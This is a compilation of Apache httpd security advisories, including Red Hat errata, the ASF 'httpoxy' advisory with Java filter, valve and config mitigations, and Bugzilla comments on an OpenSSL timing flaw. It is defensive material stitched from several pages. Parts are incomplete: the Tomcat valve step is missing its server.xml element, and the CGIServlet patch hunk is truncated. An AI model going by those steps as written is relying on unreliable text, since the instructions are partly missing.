A design error in the "ap\_some\_auth\_required" function renders the API unusuable in httpd 2.4.x. In particular the API is documented to answering if the request required authentication but only answers if there are Require lines in the applicable configuration. Since 2.4.x Require lines are used for authorization as well and can appear in configurations even when no authentication is required and the request is entirely unrestricted. This could lead to modules using this API to allow access when they should otherwise not do so. API users should use the new ap\_some\_authn\_required API added in 2.4.16 instead.

### moderate: mod\_status buffer overflow ([CVE-2014-0226](https://www.cve.org/CVERecord?id=CVE-2014-0226))

A race condition was found in mod\_status. An attacker able to access a public server status page on a server using a threaded MPM could send a carefully crafted request which could lead to a heap buffer overflow. Note that it is not a default or recommended configuration to have a public accessible server status page.

### moderate: mod\_dav crash ([CVE-2013-6438](https://www.cve.org/CVERecord?id=CVE-2013-6438))

XML parsing code in mod\_dav incorrectly calculates the end of the string when removing leading spaces and places a NUL character outside the buffer, causing random crashes. This XML parsing code is only used with DAV provider modules that support DeltaV, of which the only publicly released provider is mod\_dav\_svn.

## Topic

An update for httpd is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The httpd packages provide the Apache HTTP Server, a powerful, efficient, and extensible web server.

Security Fix(es):

* It was discovered that the mod\_session\_crypto module of httpd did not use any mechanisms to verify integrity of the encrypted session data stored in the user's browser. A remote attacker could use this flaw to decrypt and modify session data using a padding oracle attack. (CVE-2016-0736)
* It was discovered that the mod\_auth\_digest module of httpd did not properly check for memory allocation failures. A remote attacker could use this flaw to cause httpd child processes to repeatedly crash if the server used HTTP digest authentication. (CVE-2016-2161)
* It was discovered that the HTTP parser in httpd incorrectly allowed certain characters not permitted by the HTTP protocol specification to appear unencoded in HTTP request headers. If httpd was used in conjunction with a proxy or backend server that interpreted those characters differently, a remote attacker could possibly use this flaw to inject data into HTTP responses, resulting in proxy cache poisoning. (CVE-2016-8743)

Note: The fix for the CVE-2016-8743 issue causes httpd to return "400 Bad Request" error to HTTP clients which do not strictly follow HTTP protocol specification. A newly introduced configuration directive "HttpProtocolOptions Unsafe" can be used to re-enable the old less strict parsing. However, such setting also re-introduces the CVE-2016-8743 issue.

Bug Fix(es):

* When waking up child processes during a graceful restart, the httpd parent process could attempt to open more connections than necessary if a large number of child processes had been active prior to the restart. Consequently, a graceful restart could take a long time to complete. With this update, httpd has been fixed to limit the number of connections opened during a graceful restart to the number of active children, and the described problem no longer occurs. (BZ#1420002)
* Previously, httpd running in a container returned the 500 HTTP status code (Internal Server Error) when a connection to a WebSocket server was closed. As a consequence, the httpd server failed to deliver the correct HTTP status and data to a client. With this update, httpd correctly handles all proxied requests to the WebSocket server, and the described problem no longer occurs. (BZ#1429947)
* In a configuration using LDAP authentication with the mod\_authnz\_ldap module, the name set using the AuthLDAPBindDN directive was not correctly used to bind to the LDAP server for all queries. Consequently, authorization attempts failed. The LDAP modules have been fixed to ensure the configured name is correctly bound for LDAP queries, and authorization using LDAP no longer fails. (BZ#1420047)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing the updated packages, the httpd daemon will be restarted automatically.

RHEL Engineering is moving the tracking of its product development work on RHEL 6 through RHEL 9 to Red Hat Jira ([**issues.redhat.com**](https://issues.redhat.com)). If you're a Red Hat customer, please continue to file support cases via the [**Red Hat customer portal**](https://access.redhat.com/support/cases/). If you're not, please head to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira and file new tickets here. Individual Bugzilla bugs in the statuses "**NEW**", "**ASSIGNED**", and "**POST**" are being migrated throughout September 2023. Bugs of Red Hat partners with an assigned Engineering Partner Manager (EPM) are migrated in late September as per pre-agreed dates. Bugs against components "**kernel**", "**kernel-rt**", and "**kpatch**" are only migrated if still in "**NEW**" or "**ASSIGNED**". If you cannot log in to RH Jira, please consult [**article #7032570**](https://access.redhat.com/articles/7032570). That failing, please send an e-mail to the RH Jira admins at **rh-issues@redhat.com** to troubleshoot your issue as a user management inquiry. The email creates a ServiceNow ticket with Red Hat. Individual Bugzilla bugs that are migrated will be moved to status "**CLOSED**", resolution "**MIGRATED**", and set with "**MigratedToJIRA**" in "**Keywords**". The link to the successor Jira issue will be found under "**Links**", have a little "two-footprint" icon next to it, and direct you to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira (issue links are of type "**https://issues.redhat.com/browse/RHEL-XXXX**", where "**X**" is a digit). This same link will be available in a blue banner at the top of the page informing you that that bug has been migrated.

Advisory: Apache Software Foundation Projects and "httpoxy" CERT VU#797896
Canonical URL: https://www.apache.org/security/asf-httpoxy-response.txt
Publication: v1.0 18 July 2016
Audience
--------
This Advisory is directed to HTTP web server administrators and users of
the software indicated below, including CGI developers.
This Advisory is not directed to a general audience, especially web browser
users. The issues raised by the "httpoxy" class of vulnerabilities affect
web servers, and are not an issue for consumers of web services to address.
Background
----------
The ASF (Apache Software Foundation) offers a number of software packages
which offer HTTP protocol ("Web") requests and responses, and offer the
developer or administrator CGI (Common Gateway Interface) routing through
these software packages.
The Apache HTTP Server (httpd and mod\_fcgid), Apache Perl (mod\_perl) and
Apache Tomcat projects all offer CGI handling of HTTP requests.
The Apache Traffic Server proxies HTTP requests, but offers no CGI support.
Many other ASF projects utilize the HTTP protocol, but at this time we have
not identified any which provide CGI handling, or forward the HTTP "Proxy:"
header implicated in the "httpoxy" class of issues. In the event that other
projects discover such a defect, or can contribute to mitigating this class
of issues, this Advisory will be updated.
Note especially that PHP (http://www.php.net) is not an Apache Software
Foundation project (this is a common point of confusion), and that this
Advisory does not attempt to address third-party software, scripts,
libraries or components affected by the "httpoxy" group of issues.
See https://httpoxy.org/ (not affiliated with the ASF) for a complete
discussion of the "httpoxy" class of issues, which are not reiterated
in this advisory.
The Apache Software Foundation wishes to thank Dominic Scheirlinck
and Scott Geary of Vend for bringing this issue to the attention of
the ASF Security Team for a well-coordinated community response.
Apache HTTP Server (httpd)
--------------------------
Apache HTTP Server may be configured to proxy HTTP requests as a forward
or reverse (gateway) proxy server, can proxy requests to a FastCGI service
using mod\_proxy\_fcgi, can directly serve CGI applications using mod\_cgi
or mod\_cgid or the related mod\_isapi service. The project's mod\_fcgid
subproject (available as a separate add-in module) directly manages CGI
scripts using the FastCGI protocol.
It may also be configured to directly host a number of external modules
which run CGI-style applications in-process. The server itself does not
modify the CGI environment in this case, however, these external modules
may perform such modifications of their environment variables in-process.
Such examples include mod\_php, mod\_perl and mod\_wsgi.
To mitigate "httpoxy" issues across all of the above mechanisms, the most
direct solution is to drop any "Proxy:" header arriving from an upstream
proxy server or the origin user-agent. this will mitigate the issue for any
vulnerable back-end server or CGI across all traffic through this server.
The two lines below enabled in the httpd.conf file will remove the "Proxy:"
header from all incoming requests, before further processing;
LoadModule headers\_module {path-to}/mod\_headers.so
RequestHeader unset Proxy early
(Users who have mod\_headers compiled-in to the httpd binary must omit
the LoadModule directive above, others must adjust the {path-to} to point
to the mod\_headers.so file.)
If the administrator wishes to preserve the value of the "Proxy:" header
for most traffic, and only eliminate it from the CGI environment variable
HTTP\_PROXY, a second mitigation is offered. This patch will address this
behavior in mod\_cgi, mod\_cgid, mod\_isapi, mod\_proxy\_fcgi and mod\_fcgid,
along with all other consumers of httpd's built-in environment handling.
The bundled httpd modules all rely on ap\_add\_common\_vars() to set up the
target CGI environment. The project will include the recommended patch
below in all subsequent releases of httpd, including 2.4.24 and 2.2.32.
Users who build httpd 2.2.x or 2.4.x from source may apply the patch below,
recompile and re-install httpd to obtain this mitigation. This migitation
has been assigned the identifier CVE-2016-5387 .

Apache HTTP Server (mod\_fcgid)
------------------------------
Either mitigation listed above for Apache HTTP Server (httpd) guidance above
also mitigates all risks for CGI's which are invoked by mod\_fcgid. Therefore
any CVE with respect to mod\_fcgid is revoked as duplicate of CVE-2016-5387.
Apache Perl Module (mod\_perl)
-----------------------------
Either mitigation listed for Apache HTTP Server (httpd) guidance above
also mitigates "httpoxy" risks for requests which are served by mod\_perl.
Note also that the Perl LWP::HTTP package has long avoided recognizing
the HTTP\_PROXY environment variable, when serving CGI requests.
Apache Tomcat
-------------
Apache Tomcat provides a CGI Servlet that allows to execute a CGI
script. The CGI Servlet isn't active in the configuration delivered by
the ASF and activating it requires the user to modify the web.xml delivered.
To mitigate "httpoxy" issues in CGI Servlet there are 3 possible ways:
1 - Add a filter in the webapp that uses CGI scripts simple code to
reject the requests with PROXY headers via 400 "bad request" error.
Map the filter in web.xml of the webapp. Code like the following will
allow that:
+++
import javax.servlet.Filter;
import javax.servlet.FilterConfig;
import javax.servlet.FilterChain;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.ServletException;
/\*
\* Simple filter
\*/
public class PoxyFilter implements Filter {
protected FilterConfig filterConfig;
public void init(FilterConfig filterConfig) throws ServletException {
this.filterConfig = filterConfig;
}
public void destroy() {
this.filterConfig = null;
}
public void doFilter(ServletRequest request, ServletResponse response,
FilterChain chain) throws java.io.IOException,
ServletException {
HttpServletRequest req = (HttpServletRequest)request;
HttpServletResponse res = (HttpServletResponse)response;
String poxy = req.getHeader("proxy");
if (poxy == null) {
// call next filter in the chain.
chain.doFilter(request, response);
} else {
res.sendError(400);
}
}
}
+++
2 - Add a global valve to reject requests with PROXY header, create a
PoxyValve.java with below content, compile it and put it in a jar and
put the jar in the lib installation of your tomcat. Add the line  in conf/server.xml (like after the
AccessLogValve) and restart Tomcat:
+++
import java.io.IOException;
import javax.servlet.ServletException;
import org.apache.catalina.valves.ValveBase;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.Context;
import org.apache.catalina.Realm;
import org.apache.catalina.Session;
public class PoxyValve
extends ValveBase {
public void invoke(Request request, Response response)
throws IOException, ServletException {
String poxy = request.getHeader("Proxy");
if (poxy != null) {
response.sendError(400);
return;
}
getNext().invoke(request, response);
}
}
+++
3 - Fix the CGIServlet code with the following patch and recompile
Tomcat and replace the catalina.jar by the produced one in you
installation and restart Tomcat:
+++
--- java/org/apache/catalina/servlets/CGIServlet.java (revision 1724080)
+++ java/org/apache/catalina/servlets/CGIServlet.java (working copy)
@@ -1095,7 +1095,8 @@

+ "PROXY\_AUTHORIZATION".equalsIgnoreCase(header) ||
+ "PROXY".equalsIgnoreCase(header)) {
//NOOP per CGI specification section 11.2
} else {
envp.put("HTTP\_" + header.replace('-', '\_'),
+++
A mitigation is planned for future releases of Tomcat, tracked as
CVE-2016-5388, which will allow the user to prevent values like
HTTP\_PROXY from being propagated to the CGI Servlet environment.
Apache Traffic Server (ATS)
---------------------------
Apache Traffic Server is unaffected by this class of vulnerabilities, as
it provides no direct CGI or FastCGI request handling. As a proxy server,
ATS may be configured to route requests to vulnerable CGI applications as
described by the "httpoxy" class of exploits.
Apache Traffic Server can be configured to drop the HTTP "Proxy:" request
header from incoming requests as a mitigation, to prevent this request
header from being forwarded to potentially unhardened backend servers.
One configuration to strip the Proxy header is:
/usr/local/etc/trafficserver/plugin.config
header\_rewrite.so strip\_proxy.conf
/usr/local/etc/trafficserver/strip\_proxy.conf
cond %{READ\_REQUEST\_HDR\_HOOK}
rm-header Proxy

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A1414)

## Topic

An update is now available for Red Hat JBoss Core Services on RHEL 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Red Hat JBoss Core Services is a set of supplementary software for Red Hat JBoss middleware products. This software, such as Apache HTTP Server, is common to multiple JBoss middleware products, and is packaged under Red Hat JBoss Core Services to allow for faster distribution of updates, and for a more consistent update experience.

This release of Red Hat JBoss Core Services Apache HTTP Server 2.4.23 Service Pack 1 serves as a replacement for Red Hat JBoss Core Services Apache HTTP Server 2.4.23, and includes bug fixes, which are documented in the Release Notes document linked to in the References.

Security Fix(es):

* A memory leak flaw was found in the way OpenSSL handled TLS status request extension data during session renegotiation. A remote attacker could cause a TLS server using OpenSSL to consume an excessive amount of memory and, possibly, exit unexpectedly after exhausting all available memory, if it enabled OCSP stapling support. (CVE-2016-6304)
* It was discovered that the mod\_session\_crypto module of httpd did not use any mechanisms to verify integrity of the encrypted session data stored in the user's browser. A remote attacker could use this flaw to decrypt and modify session data using a padding oracle attack. (CVE-2016-0736)
* It was discovered that the mod\_auth\_digest module of httpd did not properly check for memory allocation failures. A remote attacker could use this flaw to cause httpd child processes to repeatedly crash if the server used HTTP digest authentication. (CVE-2016-2161)
* A timing attack flaw was found in OpenSSL that could allow a malicious user with local access to recover ECDSA P-256 private keys. (CVE-2016-7056)
* A denial of service flaw was found in the way the TLS/SSL protocol defined processing of ALERT packets during a connection handshake. A remote attacker could use this flaw to make a TLS/SSL server consume an excessive amount of CPU and fail to accept connections from other clients. (CVE-2016-8610)
* It was discovered that the HTTP parser in httpd incorrectly allowed certain characters not permitted by the HTTP protocol specification to appear unencoded in HTTP request headers. If httpd was used in conjunction with a proxy or backend server that interpreted those characters differently, a remote attacker could possibly use this flaw to inject data into HTTP responses, resulting in proxy cache poisoning. (CVE-2016-8743)
* A vulnerability was found in httpd's handling of the LimitRequestFields directive in mod\_http2, affecting servers with HTTP/2 enabled. An attacker could send crafted requests with headers larger than the server's available memory, causing httpd to crash. (CVE-2016-8740)

Red Hat would like to thank the OpenSSL project for reporting CVE-2016-6304 and Shi Lei (Gear Team of Qihoo 360 Inc.) for reporting CVE-2016-8610. Upstream acknowledges Shi Lei (Gear Team of Qihoo 360 Inc.) as the original reporter of CVE-2016-6304.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

For the update to take effect, all services linked to the OpenSSL library must be restarted, or the system rebooted. After installing the updated packages, the httpd daemon will be restarted automatically.

| [Description](show_bug.cgi?id=1412120#c0)  Andrej Nemec    2017-01-11 10:09:24 UTC  ``` The signing function in crypto/ecdsa/ecdsa_ossl.c in certain OpenSSL versions and forks is vulnerable to timing attacks when signing with the standardized elliptic curve P-256 despite featuring constant-time curve operations and modular inversion. A software defect omits setting the BN_FLG_CONSTTIME flag for nonces, failing to take a secure code path in the BN_mod_inverse method and therefore resulting in a cache-timing attack vulnerability. A malicious user with local access can recover ECDSA P-256 private keys.

Sidhpurwala    2017-01-12 08:41:54 UTC  ``` Statement:  In order to exploit this flaw, the attacker needs to be have local (shell) access to the machine where the message is being signed using the ECDSA algorithm with a P-256 elliptic curve key. Then using cache timing attacks (which needs precise timing), on multiple signature runs, the private key could be obtained. Based on the factor that exploitation is difficult, Red Hat Product Security Team has rated this flaw as having Moderate impact. A further security release may address this flaw.   ```  [Comment 12](show_bug.cgi?id=1412120#c12)  errata-xmlrpc    2017-06-07 17:46:07 UTC  ``` This issue has been addressed in the following products:    Red Hat JBoss Core Services  Via RHSA-2017:1415 [https://access.redhat.com/errata/RHSA-2017:1415](https://access.redhat.com/errata/RHSA-2017%3A1415)   ```  [Comment 13](show_bug.cgi?id=1412120#c13)  errata-xmlrpc    2017-06-07 17:57:59 UTC  ``` This issue has been addressed in the following products:    JBoss Core Services on RHEL 6  Via RHSA-2017:1414 [https://access.redhat.com/errata/RHSA-2017:1414](https://access.redhat.com/errata/RHSA-2017%3A1414)   ```  [Comment 14](show_bug.cgi?id=1412120#c14)  errata-xmlrpc    2017-06-07 18:00:39 UTC  ``` This issue has been addressed in the following products:    JBoss Core Services on RHEL 7  Via RHSA-2017:1413 [https://access.redhat.com/errata/RHSA-2017:1413](https://access.redhat.com/errata/RHSA-2017%3A1413)   ```  [Comment 16](show_bug.cgi?id=1412120#c16)  Huzaifa S.
